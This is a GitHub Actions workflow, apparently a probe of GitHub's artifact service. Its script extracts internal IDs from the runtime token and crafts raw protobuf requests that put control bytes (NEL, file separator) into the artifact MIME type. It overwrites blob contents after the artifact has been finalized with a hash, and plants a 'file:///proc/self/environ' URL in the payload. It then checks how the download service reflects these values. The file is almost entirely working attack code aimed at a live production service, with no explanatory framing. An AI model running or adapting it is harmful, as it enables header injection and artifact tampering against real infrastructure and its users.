name: Repo Cassette protobuf MIME probe

on:
  workflow_dispatch:

permissions:
  actions: read

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Probe raw protobuf MIME bytes
        uses: actions/github-script@v7
        env:
          GITHUB_TOKEN: ${{ github.token }}
        with:
          script: |
            const {createHash} = require('node:crypto');
            const token = process.env.ACTIONS_RUNTIME_TOKEN;
            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
            if (!token || !resultsUrl) throw new Error('Runtime artifact credentials unavailable');
            const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
            const scope = claims.scp.split(' ').find(s => s.startsWith('Actions.Results:'));
            if (!scope) throw new Error('Actions.Results scope missing');
            const [, runId, jobId] = scope.split(':');
            const ids = {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId};
            const service = new URL(resultsUrl).origin + '/twirp/github.actions.results.api.v1.ArtifactService/';
            const repo = process.env.GITHUB_REPOSITORY;

            function varint(value) {
              const bytes = [];
              do {
                let byte = value & 0x7f;
                value >>>= 7;
                if (value) byte |= 0x80;
                bytes.push(byte);
              } while (value);
              return Buffer.from(bytes);
            }
            function bytesField(number, value) {
              return Buffer.concat([varint(number * 8 + 2), varint(value.length), value]);
            }
            function createBody(name, mimeBytes) {
              return Buffer.concat([
                bytesField(1, Buffer.from(runId)),
                bytesField(2, Buffer.from(jobId)),
                bytesField(3, Buffer.from(name)),
                varint(5 * 8), varint(7),
                bytesField(6, bytesField(1, mimeBytes))
              ]);
            }
            function readVarint(buffer, position) {
              let value = 0, shift = 0;
              while (position < buffer.length) {
                const byte = buffer[position++];
                value += (byte & 0x7f) * 2 ** shift;
                if (!(byte & 0x80)) return [value, position];
                shift += 7;
              }
              throw new Error('Truncated protobuf varint');
            }
            function parseCreateResponse(buffer, type) {
              if (type.includes('json')) {
                const value = JSON.parse(buffer.toString('utf8'));
                return {ok: value.ok === true, uploadUrl: value.signed_upload_url || value.signedUploadUrl, reason: String(value.msg || value.code || '').slice(0, 100)};
              }
              let position = 0, ok = false, uploadUrl = '';
              while (position < buffer.length) {
                let tag; [tag, position] = readVarint(buffer, position);
                const field = Math.floor(tag / 8), wire = tag % 8;
                if (wire === 0) {
                  let value; [value, position] = readVarint(buffer, position);
                  if (field === 1) ok = value !== 0;
                } else if (wire === 2) {
                  let length; [length, position] = readVarint(buffer, position);
                  const value = buffer.subarray(position, position + length);
                  position += length;
                  if (field === 2) uploadUrl = value.toString('utf8');
                } else throw new Error(`Unexpected protobuf wire type ${wire}`);
              }
              return {ok, uploadUrl, reason: ''};
            }
            async function finalize(name, size, hash) {
              const response = await fetch(service + 'FinalizeArtifact', {
                method: 'POST',
                headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
                body: JSON.stringify({...ids, name, size: String(size), hash})
              });
              return {status: response.status, data: await response.json().catch(() => ({}))};
            }
            async function putBlob(url, bytes) {
              const response = await fetch(url, {
                method: 'PUT',
                headers: {
                  'x-ms-blob-type': 'BlockBlob',
                  'x-ms-blob-content-type': 'application/json\u0085',
                  'x-ms-version': '2023-11-03',
                  'Content-Type': 'application/octet-stream'
                }, body: bytes
              });
              if (!response.ok) throw new Error(`Azure PUT status=${response.status}`);
            }
            async function inspect(label, artifactId, expected) {
              const endpoint = `https://api.github.com/repos/${repo}/actions/artifacts/${artifactId}/zip`;
              const first = await fetch(endpoint, {
                headers: {'Accept': 'application/vnd.github.v3+json', 'Authorization': `Bearer ${process.env.GITHUB_TOKEN}`},
                redirect: 'manual'
              });
              if (first.status !== 302) {
                core.info(`PROTO ${label} artifact_id=${artifactId} api_status=${first.status}`);
                return;
              }
              const location = first.headers.get('location');
              if (!location) throw new Error('Redirect lacked Location');
              const rsct = new URL(location).searchParams.get('rsct');
              const response = await fetch(location);
              const body = Buffer.from(await response.arrayBuffer());
              const type = response.headers.get('content-type') || '';
              core.info(`PROTO ${label} artifact_id=${artifactId} status=${response.status} rsct_utf8_hex=${rsct === null ? 'absent' : Buffer.from(rsct).toString('hex')} type_latin1_hex=${Buffer.from(type, 'latin1').toString('hex')} body_matches=${body.equals(expected)}`);
            }

            const ascii = Buffer.from('application/json');
            const candidates = [
              ['valid', ascii],
              ['raw_nel', Buffer.concat([ascii, Buffer.from([0x85])])],
              ['utf8_nel', Buffer.from('application/json\u0085')],
              ['raw_fs', Buffer.concat([ascii, Buffer.from([0x1c])])]
            ];
            for (const [label, mimeBytes] of candidates) {
              const name = `proto-mime-${process.env.GITHUB_RUN_ID}-${label}.json`;
              const response = await fetch(service + 'CreateArtifact', {
                method: 'POST',
                headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/protobuf'},
                body: createBody(name, mimeBytes)
              });
              const raw = Buffer.from(await response.arrayBuffer());
              const type = response.headers.get('content-type') || '';
              let created;
              try { created = parseCreateResponse(raw, type); }
              catch { created = {ok: false, reason: 'unparsed response', uploadUrl: ''}; }
              core.info(`PROTO ${label} create_status=${response.status} response_type=${type} ok=${created.ok} reason=${created.reason}`);
              if (response.status !== 200 || !created.ok || !created.uploadUrl) continue;
              const placeholder = Buffer.from('{"probe":"placeholder"}');
              await putBlob(created.uploadUrl, placeholder);
              const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
              const done = await finalize(name, placeholder.length, hash);
              core.info(`PROTO ${label} finalize_status=${done.status} ok=${done.data.ok === true}`);
              if (done.status !== 200 || done.data.ok !== true) continue;
              const artifactId = done.data.artifact_id || done.data.artifactId;
              const repository = `${repo}/actions/artifacts/${artifactId}/zip`;
              const bytes = Buffer.from(JSON.stringify({
                full_name: repository,
                owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'},
                description: label
              }));
              await putBlob(created.uploadUrl, bytes);
              await inspect(label, artifactId, bytes);
            }
